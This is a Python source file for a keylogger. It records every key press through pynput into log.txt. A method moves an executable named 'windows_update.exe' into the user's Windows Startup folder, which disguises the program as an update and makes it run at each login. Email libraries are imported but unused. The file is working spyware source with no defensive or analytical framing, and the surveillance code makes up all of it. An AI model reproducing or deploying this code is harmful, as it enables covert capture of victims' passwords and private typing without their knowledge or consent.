import pynput.keyboard
import smtplib, ssl
import time
import getpass
import shutil

class Keylogger:
    
    def __init__(self):
        self.logger = ""

    def send_data(self, keystrike):
        self.logger += keystrike
        with open("log.txt","a+",encoding="utf-8") as new_file:
            new_file.write(self.logger)

        self.logger = ""

    def take_keys(self, key):
        
        try:
            hit_key = str(key.char)

        except AttributeError:
            
            if key == key.space:
                hit_key = ""

            else:
                hit_key = "" + str(key) + ""

        self.send_data(hit_key)

    def change_dir(self, username):
        username = getpass.getuser()
        path = f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
        shutil.move("windows_update.exe", path)


    def main(self):
        listener = pynput.keyboard.Listener(on_press=self.take_keys)
        with listener:
            self.logger = ""
            listener.join()


Keylogger().main()
